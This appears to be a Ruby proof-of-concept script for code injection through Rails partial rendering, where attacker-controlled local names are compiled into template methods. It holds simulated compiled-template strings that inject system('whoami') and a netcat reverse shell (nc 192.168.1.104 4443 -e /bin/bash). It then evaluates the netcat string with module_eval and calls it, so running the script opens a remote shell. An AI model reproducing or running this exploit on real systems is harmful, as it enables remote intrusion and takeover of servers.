first_run = '          def _app_views_users_index_html_erb__1586920598637749986_47251060435880(local_assigns, output_buffer)
            _old_virtual_path, @virtual_path = @virtual_path, "users/index";_old_output_buffer = @output_buffer;;@output_buffer = output_buffer || ActionView::OutputBuffer.new;@output_buffer.safe_append=\'<h1>Users#index</h1>
<p>Find me in app/views/users/index.html.erb</p>

\'.freeze;@output_buffer.append=( render partial: \'unsafe\', locals: params );@output_buffer.safe_append=\'
\'.freeze;
@output_buffer.to_s
          ensure
            @virtual_path, @output_buffer = _old_virtual_path, _old_output_buffer
          end
'

second_run = '          def _app_views_users__unsafe_html_erb__4346715407717240269_47251059271460(local_assigns, output_buffer)
            _old_virtual_path, @virtual_path = @virtual_path, "users/_unsafe";_old_output_buffer = @output_buffer;action = action = local_assigns[:action];controller = controller = local_assigns[:controller];system(\'whoami\');a# = system(\'whoami\');a# = local_assigns[:system(\'whoami\');a#];;@output_buffer = output_buffer || ActionView::OutputBuffer.new;@output_buffer.safe_append=\'correkthorse\'.freeze;@output_buffer.to_s
          ensure
            @virtual_path, @output_buffer = _old_virtual_path, _old_output_buffer
          end
'

netcat = '          def _app_views_users__unsafe_html_erb__242640785170445879_70148765187920(local_assigns, output_buffer)
_old_virtual_path, @virtual_path = @virtual_path, "users/_unsafe";_old_output_buffer = @output_buffer;action = action = local_assigns[:action];controller = controller = local_assigns[:controller];system(\'nc 192.168.1.104 4443 -e /bin/bash\');a# = system(\'nc 192.168.1.104 4443 -e /bin/bash\');a# = local_assigns[:system(\'nc 192.168.1.104 4443 -e /bin/bash\');a#];;@output_buffer = output_buffer || ActionView::OutputBuffer.new;@output_buffer.safe_append=\'correkthorse\'.freeze;@output_buffer.to_s
ensure
@virtual_path, @output_buffer = _old_virtual_path, _old_output_buffer
end
'

#https://apidock.com/ruby/Module/module_eval


source = "def test
  system(\'whoami\');
end"

class Thing
end
a = %q{def hello() "Hello there!" end}
Thing.module_eval(a)
puts Thing.new.hello()

Thing.module_eval(netcat)

puts Thing.new._app_views_users__unsafe_html_erb__242640785170445879_70148765187920({},String.new)